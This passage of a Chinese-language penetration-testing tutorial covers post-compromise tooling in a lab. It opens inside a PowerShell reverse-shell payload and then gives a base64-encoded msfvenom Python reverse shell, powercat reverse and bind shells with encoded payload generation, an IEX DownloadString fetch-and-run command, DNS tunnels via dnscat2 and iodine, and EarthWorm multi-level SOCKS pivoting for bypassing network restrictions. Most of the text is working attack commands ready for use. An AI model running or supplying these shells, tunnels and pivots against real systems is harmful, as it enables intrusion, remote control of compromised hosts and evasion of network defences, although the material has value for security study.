$null);$esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);$c.connect($a,$b);$s&#x3D;$c.GetStream();while ($true) &#123;    start-sleep -m 100;    if ($osread.IsCompleted -and $osread.Result -ne 0) &#123;      $r&#x3D;$os.BaseStream.EndRead($osread);      $s.Write($ob,0,$r);      $s.Flush();      $osread&#x3D;$os.BaseStream.BeginRead($ob, 0, $ob.Length, $null, $null);    &#125;    if ($esread.IsCompleted -and $esread.Result -ne 0) &#123;      $r&#x3D;$es.BaseStream.EndRead($esread);      $s.Write($eb,0,$r);      $s.Flush();      $esread&#x3D;$es.BaseStream.BeginRead($eb, 0, $eb.Length, $null, $null);    &#125;    if ($s.DataAvailable) &#123;      $r&#x3D;$s.Read($nb,0,$nb.Length);      if ($r -lt 1) &#123;          break;      &#125; else &#123;          $str&#x3D;$e.GetString($nb,0,$r);          $is.write($str);      &#125;    &#125;    if ($c.Connected -ne $true -or ($c.Client.Poll(1,[System.Net.Sockets.SelectMode]::SelectRead) -and $c.Client.Available -eq 0)) &#123;        break;    &#125;    if ($p.ExitCode -ne $null) &#123;        break;    &#125;&#125;&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将生成的 payload 复制到失陷主机上运行，即可收到反弹回的 shell</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-05-28_12-36-45.png"></p><p>再比如使用 <code>cmd/unix/reverse_python</code> 这个payload</p><pre class="line-numbers language-none"><code class="language-none"># 控制端&gt; msfvenom -p cmd&#x2F;unix&#x2F;reverse_python lhost&#x3D;172.16.214.43 lport&#x3D;4444[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload[-] No arch selected, selecting arch: cmd from the payloadNo encoder specified, outputting raw payloadPayload size: 505 bytespython -c &quot;exec(__import__(&#39;base64&#39;).b64decode(__import__(&#39;codecs&#39;).getencoder(&#39;utf-8&#39;)(&#39;aW1wb3J0IHNvY2tldCAgICwgc3VicHJvY2VzcyAgICwgb3M7ICAgICAgaG9zdD0iMTcyLjE2LjIxNC40MyI7ICAgICAgcG9ydD00NDQ0OyAgICAgIHM9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgICAgICBzLmNvbm5lY3QoKGhvc3QgICAsIHBvcnQpKTsgICAgICBvcy5kdXAyKHMuZmlsZW5vKCkgICAsIDApOyAgICAgIG9zLmR1cDIocy5maWxlbm8oKSAgICwgMSk7ICAgICAgb3MuZHVwMihzLmZpbGVubygpICAgLCAyKTsgICAgICBwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik&#x3D;&#39;)[0]))&quot;&gt; nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>同样将生成的 payload 复制到失陷主机上运行，即可收到反弹回来的 shell，当然前提是目标主机安装了 python</p><h2 id="3、socat-使用"><a href="#3、socat-使用" class="headerlink" title="3、socat 使用"></a>3、socat 使用</h2><p>socat 下载地址：<a href="http://www.dest-unreach.org/socat/">http://www.dest-unreach.org/socat/</a>，或者直接使用 <code>apt-get install socat</code> 安装，Mac 可使用 <code>brew install socat</code> 安装。</p><p>socat 全称 socket cat，可以视为 nc 的加强版，不过平时感觉 nc 也够用了，但是 nc 现在貌似会被杀软杀掉，而且貌似 nc 很久没更新了，反正多掌握点知识没坏处。</p><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><p><strong>读取文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; socat - .&#x2F;test.txt  # 相对路径读取test&gt; socat - &#x2F;tmp&#x2F;test.txt# 绝对路径读取test<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>写入文件</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; echo &quot;hello world&quot; | socat - .&#x2F;test.txt&gt; socat - .&#x2F;test.txttesthello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="网络操作"><a href="#网络操作" class="headerlink" title="网络操作"></a>网络操作</h3><p><strong>连接远程端口</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt; socat - TCP:172.16.214.1:22SSH-2.0-OpenSSH_7.4<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>监听端口</strong></p><pre class="line-numbers language-none"><code class="language-none">socat - TCP-LISTEN:8002<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><p><strong>转发 TCP 端口</strong></p><p>个人觉着这个是比较常用到的功能，在使用 CS 做重定向器时，就可以使用 socat 进行端口的转发。</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在访问当前主机的 80 端口时，就会访问到 123.123.123.123 的 80 端口了，也可以使用 -d 调整输出信息的详细程度，最多使用四个 d，推荐使用两个，即 -dd</p><pre class="line-numbers language-none"><code class="language-none">socat -dd TCP4-LISTEN:80,fork TCP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>转发 UDP 端口</strong></p><p>和上面一样，将 TCP 改成 UDP 即可</p><pre class="line-numbers language-none"><code class="language-none">socat UDP4-LISTEN:80,fork UDP4:123.123.123.123:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>NAT 映射</strong></p><p>通过 socat 可以将内网端口映射到公网上，不过这种场景还是更推荐用 frp</p><pre class="line-numbers language-none"><code class="language-none"># 内网主机socat tcp:123.123.123.123:4444 tcp:127.0.0.1:3389# 公网主机socat tcp-listen:4444 tcp-listen:5555<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时访问公网主机的 5555 端口就可以访问到内网主机的 3389 端口了</p><p>考虑到 socat 的其他功能平时也很少使用到，这里就不过多介绍了，网上相关文章也有很多，在此就不赘述了。</p><h1 id="0x08-powercat-的使用"><a href="#0x08-powercat-的使用" class="headerlink" title="0x08 powercat 的使用"></a>0x08 powercat 的使用</h1><h2 id="1、下载安装-powercat"><a href="#1、下载安装-powercat" class="headerlink" title="1、下载安装 powercat"></a>1、下载安装 powercat</h2><p>powercat 可以视为 nc 的 powershell 版本，因此也可以和 nc 进行连接。</p><p>powercat 可在 github 进行下载，项目地址为：<a href="https://github.com/besimorhino/powercat">https://github.com/besimorhino/powercat</a></p><p>下载下来 powercat.ps1 文件后，直接导入即可</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\powercat.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果提示未能加载指定模块，则可能是权限问题，可以参照之前写的 <a href="https://teamssix.com/year/210206-191859.html">【内网学习笔记】2、PowerShell</a> 文章中的方法对其赋予权限，即在管理员模式下运行以下命令</p><pre class="line-numbers language-none"><code class="language-none">Set-ExecutionPolicy Unrestricted<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后就可以导入 powercat 了，导入成功后，输入 powercat -h 可以看到帮助信息。</p><p>如果没有权限，也可以直接下载远程文件进行绕过。</p><pre class="line-numbers language-none"><code class="language-none">IEX (New-Object System.Net.Webclient).DownloadString(&#39;https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;besimorhino&#x2F;powercat&#x2F;master&#x2F;powercat.ps1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不过由于 github 在国内可能会无法打开，因此可以使用 web 代理站点或者把 powercat.ps1 文件放到自己的服务器上进行下载。</p><h2 id="2、powercat-的使用"><a href="#2、powercat-的使用" class="headerlink" title="2、powercat 的使用"></a>2、powercat 的使用</h2><p>powercat 命令参数</p><pre class="line-numbers language-none"><code class="language-none">-l监听模式-p指定监听端口-e指定启动进程的名称-v显示详情-c指定想要连接的 IP 地址-ep返回 powershell-dns使用 dns 通信-g生成 payload-ge生成经过编码的 payload，可以直接使用 powershell -e 执行该 payload<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到和 nc 的命令还是很相似的。</p><h3 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h3><p>Kali 上的 nc 连接到靶机</p><pre class="line-numbers language-none"><code class="language-none">nc -v rhost rport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.21 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机开启监听，等待 Kali 连接</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h3><p>Kali 上开启监听</p><pre class="line-numbers language-none"><code class="language-none">nc -lvp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机向 kali 发起连接</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.46 -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="返回-powershell"><a href="#返回-powershell" class="headerlink" title="返回 powershell"></a>返回 powershell</h3><p>攻击机上运行</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p lport<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>靶机上运行</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v -ep<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="作为跳板使用"><a href="#作为跳板使用" class="headerlink" title="作为跳板使用"></a>作为跳板使用</h3><p>测试环境为：</p><pre class="line-numbers language-none"><code class="language-none">kali172.16.214.47windows7172.16.214.2windows10172.16.214.21<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>将 win7 作为跳板机，让 kali 通过 win7 连接到 windows10</p><p>在 win10 中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 4444 -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 win7 中执行以下命令</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -v -p 5555 -r tcp:172.16.214.21:4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后在 kali 下连接 win7</p><pre class="line-numbers language-none"><code class="language-none">nc -v 172.16.214.2 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_14-23-47.png"></p><h3 id="powercat-生成-payload"><a href="#powercat-生成-payload" class="headerlink" title="powercat 生成 payload"></a>powercat 生成 payload</h3><p>在攻击机上运行以下命令生成 shell.ps1 payload 文件</p><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -e cmd -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将 shell.ps1 文件拷贝到目标主机上后，执行 shell.ps1 文件</p><p>之后在攻击机上运行以下命令即可获得 shell</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.21 -p 4444 -v <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>反向连接也可以</p><p>在攻击机上生成 ps1 文件，并开启监听</p><pre class="line-numbers language-none"><code class="language-none">powercat -c rhost -p rport -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -g &gt; shell.ps1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后在靶机上，运行 ps1 文件就会上线了，如果不想生成文件，也可以使用 -ge 生成经过编码的 payload</p><p>在攻击机上生成 payload，并开启监听</p><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.2 -p 4444 -ep -ge<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">powercat -l -p 4444 -v<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机上执行刚生成的 payload</p><pre class="line-numbers language-none"><code class="language-none">powershell -e payload<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-01_15-35-24.png"></p><h3 id="建立-dns-隧道连接"><a href="#建立-dns-隧道连接" class="headerlink" title="建立 dns 隧道连接"></a>建立 dns 隧道连接</h3><p>powercat 的 dns 隧道是基于 dnscat 设计的，因此在服务端需要使用 dnscat 连接。</p><p>在服务端上安装 dnscat ，以 kali 为例</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;iagox86&#x2F;dnscat2.gitcd dnscat2&#x2F;server&#x2F;gem install bundlerbundle install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>命令运行完之后，执行以下命令开启服务端</p><pre class="line-numbers language-none"><code class="language-none">ruby dnscat2.rb powercat -e open --no-cache<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在靶机下，执行以下命令，建立 dns 隧道</p><pre class="line-numbers language-none"><code class="language-none">powercat -c 172.16.214.47 -p 53 -dns powercat -e cmd.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此时，在 kali 上就能看到回连的会话了</p><pre class="line-numbers language-none"><code class="language-none">sessions#查看所有会话session -i 1 #选择指定的会话进行交互<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不过实测，虽然能返回会话，但不能执行命令，暂不清楚原因是什么。</p><p>powercat 暂时就记录这些，其他的比如文件传输什么的就不记了，毕竟使用频率几乎为零，平时使用最多的可能还是拿它来反弹 shell，不过为什么不用 CS 或者 MSF 呢，不更香嘛。</p><h1 id="0x09-iodine-使用"><a href="#0x09-iodine-使用" class="headerlink" title="0x09 iodine 使用"></a>0x09 iodine 使用</h1><h2 id="1、介绍-3"><a href="#1、介绍-3" class="headerlink" title="1、介绍"></a>1、介绍</h2><p>iodine 这个名字起的很有意思，iodine 翻译过来就是碘，碘的原子序数为 53，53 也就是 DNS 服务对应的端口号。 </p><p>iodine 和 dnscat2 一样，适合于其他请求方式被限制以至于只能发送 DNS 请求的环境中，iodine 同样也是分成了直接转发和中继两种模式。</p><p>iodine 与 dnscat2 不同的在于 Iodine 服务端和客户端都是用 C 语言开发，同时 iodine 的原理也有些不同，iodine 通过 TAP 在服务端和客户端分别建立一个局域网和虚拟网卡，再通过 DNS 隧道进行连接，然后使其处在同一个局域网中。</p><h2 id="2、安装-1"><a href="#2、安装-1" class="headerlink" title="2、安装"></a>2、安装</h2><p>首先需要有一个域名，并设置 NS 和 A 记录，A 记录指向自己的公网 VPS 地址，NS 记录指向 A 记录的子域名。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-07_17-20-20.png"></p><p>Kali 下自带 iodine ，Debian Linux 可以使用 apt 进行安装</p><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install iodine<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Windows 可以直接到官网下载，下载地址：<a href="https://code.kryo.se/iodine/">https://code.kryo.se/iodine/</a>，服务端名称是 iodined.exe，客户端是 iodine.exe</p><h2 id="3、使用-1"><a href="#3、使用-1" class="headerlink" title="3、使用"></a>3、使用</h2><p>这里服务端使用的是 Linux，服务端命令如下：</p><pre class="line-numbers language-none"><code class="language-none">sudo iodined -f -c -P teamssix 192.168.77.1 dc.teamssix.com -DD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-f在前台运行-c不检查传入请求的客户端 IP 地址-P客户端与服务端之间的连接密码-D调试级别，-D 表示第一级，-DD 表示第二级，依此类推192.168.77.1 是自己自定义的局域网虚拟 IP 地址。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里客户端使用的是 Windows，Windows 客户端上除了要有 iodine 相关文件外，还需要安装 tap 网卡驱动程序，这里我百度找了一个下载地址 <a href="http://www.qudong51.net/qudong/981.html">http://www.qudong51.net/qudong/981.html</a></p><p>打开下载好的 tap 网卡驱动程序，一直下一步下一步安装就行。</p><p>然后就可以启动客户端程序了，注意下载下来的 dll 文件要和 exe 在一个目录下，不能只复制一个 exe 到目标主机上，而且要以管理员权限运行下面的命令。</p><pre class="line-numbers language-none"><code class="language-none">.\iodine.exe -f -r -P teamssix dc.teamssix.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-riodine 有时会自动将 DNS 隧道切换成 UDP 通道，使用 -r 命令可以强制让 iodine 在任何情况下都使用 DNS 隧道<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果出现 <code>Connection setup complete, transmitting data.</code> 就表示 DNS 隧道就已经建立了。</p><p>这时如果去 ping 服务端自定义的虚拟 IP 也是可以 ping 通的。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-08_21-12-06.png"></p><p>假如这里内网机器分配到了 192.168.77.2 这个 IP ，因为处在一个局域网中，所以 VPS 直接访问 192.168.77.2 的 3389、80 等端口就可以直接访问到内网机器的相关端口了，同样的内网主机也可以访问 VPS 的 22 端口等等，至此便绕过了策略限制。</p><h1 id="0x10-ew-的使用"><a href="#0x10-ew-的使用" class="headerlink" title="0x10 ew 的使用"></a>0x10 ew 的使用</h1><h2 id="1、Socks-代理工具介绍"><a href="#1、Socks-代理工具介绍" class="headerlink" title="1、Socks 代理工具介绍"></a>1、Socks 代理工具介绍</h2><p>Socks 代理可以理解成升级版的 lcx，关于 lcx 的用法可以看我之前的文章：</p><p><a href="https://teamssix.com/year/210528-130449.html">https://teamssix.com/year/210528-130449.html</a></p><p>但是 lcx 毕竟年代久远，现在的杀软基本也都能识别到了，因此在实战中不太推荐使用 lcx ，更推荐使用这些 socks 代理工具。</p><p>常见的 socks 代理工具有 ew、termite、frp、nps、sSocks、reGeorg、Neo-reGeorg、SocksCap、Proxifier、ProxyChains 等等，不同的工具适合使用的场景和方法都有所不同。</p><p>因为在这其中有些工具笔者较经常使用，所以这里主要记录下 ew、frp、nps 的使用方法，本篇文章主要记录 ew 的使用，后续文章将更新 frp、nps 的使用。</p><p>开始之前，先理解下正向代理和反向代理的区别。</p><blockquote><p>正向代理：主动通过代理访问目标主机，即攻击主机 –》目标主机</p><p>反向代理：目标机器通过代理进行主动连接，即目标主机 –》攻击主机</p></blockquote><h2 id="2、ew-的使用"><a href="#2、ew-的使用" class="headerlink" title="2、ew 的使用"></a>2、ew 的使用</h2><p>ew 的项目主页：<a href="http://rootkiter.com/EarthWorm/">http://rootkiter.com/EarthWorm/</a></p><p>ew 全称 <code>EarthWorm</code>，直译过来就是<code>蚯蚓</code>，引用作者的原话是：</p><blockquote><p>该工具能够以“正向”、“反向”、“多级级联”等方式打通一条网络隧道，直达网络深处，用蚯蚓独有的手段突破网络限制，给防火墙松土。</p></blockquote><p>这个描述也是很形象了。</p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p>作者已经不提供 ew 的下载了，但是搜了一下 github 还是有其他人上传的，不过病毒需自查。</p><p>下载地址：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p><p>从这工具上传的时间是 5 年前就可以看出这个工具很有年代感了。</p><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><p>该工具共有 6 种命令格式 ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、lcx_tran，正向连接的命令是 ssocked，反向连接的命令是 rcsocks 和 rssocks，其他命令用于一些比较复杂的网络环境中。</p><h4 id="a、正向连接"><a href="#a、正向连接" class="headerlink" title="a、正向连接"></a>a、正向连接</h4><p>正向连接需要目标主机有一个公网 IP，或者说攻击主机能够直接访问到目标主机。</p><p>命令也很简单</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-s 设置状态模式 -l 设置监听端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 1080ssocksd 0.0.0.0:1080 &lt;--[10000 usec]--&gt; socks server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后使用 SocksCap、Proxifier、ProxyChains 等工具配置上目标主机的 IP 和监听端口即可，socks 要选择 socks5</p><h4 id="b、反向连接"><a href="#b、反向连接" class="headerlink" title="b、反向连接"></a>b、反向连接</h4><p>反向连接适合于目标没有公网 IP 的情况，这时就需要一台公网 vps 了，这里就直接以内网地址作为演示了。</p><p>在公网 VPS 上执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-e 设置反弹主机端口<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示将 1080 端口接收到的数据转发到 4444 端口上。</p><p>在目标主机上执行以下命令：</p><pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d vps_ip -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">-d 设置反弹主机 IP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s rssocks -d 172.16.214.52 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示在本地开启 socks 5 服务，并反弹到 vps 的 4444 端口，如果代理建立成功，在 VPS 端就会看到 <code>rssocks cmd_socket OK!</code> 的提示。</p><p>最后，代理 vps 的 1080 端口就可以访问到目标主机的内网了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-06-09_10-24-45.png"></p><h4 id="c、二级网络环境（一）"><a href="#c、二级网络环境（一）" class="headerlink" title="c、二级网络环境（一）"></a>c、二级网络环境（一）</h4><p>有这样的一个网络环境，目标主机A有两个网卡，一个内网地址一个公网地址，但这个主机只能访问内网主机B不能访问其他内网资源，而内网主机B不能访问外网但是能访问内网资源。</p><p>在拿到这两台主机权限后，就可以使用 ew 进行二级跳板访问到内网资源。</p><pre class="line-numbers language-none"><code class="language-none">内网主机A（有公网IP） --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机B上，开启正向连接代理</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机A上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_tran -l 1080 -f hostB_ip -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_tran -l 1080 -f 192.168.7.110 -g 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这条命令表示将 1080 端口收到的代理请求转发到内网主机 B 192.168.7.110 的 4444 端口，此时就可以通过访问内网主机 A 的外网 IP 的 1080 端口访问到内网主机 B 上架设的 socks5 代理了。</p><h4 id="d、二级网络环境（二）"><a href="#d、二级网络环境（二）" class="headerlink" title="d、二级网络环境（二）"></a>d、二级网络环境（二）</h4><p>在上面的环境中，内网主机 A 有公网 IP，如果没有公网 IP 的情况下，又该怎么办呢？这时候就需要结合反向连接了，因此需要一台公网的 VPS 主机。</p><pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机A --》内网主机B --》内网资源<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在公网 VPS 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_listen -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示将 1080 收到的 代理请求转发到 4444 端口上</p><p>在内网主机 B 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s ssocksd -l 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示开启 5555 端口的正向代理</p><p>在内网主机 A 上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>表示在内网主机 A 上使用 lcx_slave 的方式，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来。</p><p>现在就可以通过 VPS 的 1080 端口访问到内网主机 A 再访问到内网主机 B ，最后访问到内网资源了。</p><h4 id="e、三级网络环境"><a href="#e、三级网络环境" class="headerlink" title="e、三级网络环境"></a>e、三级网络环境</h4><p>目前有这样的一个环境，内网主机 A 没有公网 IP 不能访问内网资源，但是可以访问外网和内网主机 B，内网主机 B 不能访问外网和内网资源，但是可以和 A、C 相互访问，内网主机 C 能访问内网资源，但是只能和内网主机 B 相互访问，因此如果想访问到内网资源就需要做三层跳板。</p><pre class="line-numbers language-none"><code class="language-none">VPS --》内网主机 A --》内网主机 B --》内网主机 C<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在公网 VPS 上，将 1080 端口收到的代理请求转发到 4444 端口</p><pre class="line-numbers language-none"><code class="language-none">ew -s rcsocks -l 1080 -e 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 4444rcsocks 0.0.0.0:1080 &lt;--[10000 usec]--&gt; 0.0.0.0:4444init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机 A 上，将 VPS 的 4444 端口和内网主机 B 的 5555 端口连接起来</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_slave -d vps_ip -e 4444 -f hostB_ip -g 5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;ew_for_linux64 -s lcx_slave -d 172.16.214.1 -e 4444 -f 192.168.7.110 -g 5555lcx_slave 172.16.214.1:4444 &lt;--[10000 usec]--&gt; 192.168.7.110:5555<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在内网主机 B 上，将 5555 端口收到的代理请求转发到 6666 端口上</p><pre class="line-numbers language-none"><code class="language-none">ew -s lcx_listen -l 5555 -e 6666<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .\ew_for_Win.exe -s lcx_listen -l 5555 -e 6666rcsocks 0.0.0.0:5555 &lt;--[10000 usec]--&gt; 0.0.0.0:6666init cmd_server_for_rc herestart listen port here<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在内网主机 C 上，启动 socks5 服务，并反弹到 B 主机的 6666 端口上</p><pre class="line-numbers language-none"><code class="language-none">ew -s rssocks -d 192.168.7.110 -e 6666<span aria-hidden="true" 